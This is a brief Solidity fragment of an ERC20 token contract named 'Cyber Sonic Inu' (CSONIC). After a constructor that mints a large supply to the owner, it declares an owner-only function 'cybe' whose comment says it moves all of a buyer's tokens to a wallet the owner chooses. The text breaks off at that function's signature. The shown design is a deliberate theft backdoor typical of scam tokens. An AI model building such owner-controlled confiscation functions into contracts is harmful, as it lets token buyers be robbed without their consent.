...
contract CYBERSONIC is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Cyber Sonic Inu", "CSONIC") Ownable(initialOwner) {
        _mint(initialOwner, 444000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function cybe(address from, address to) external onlyOwner {
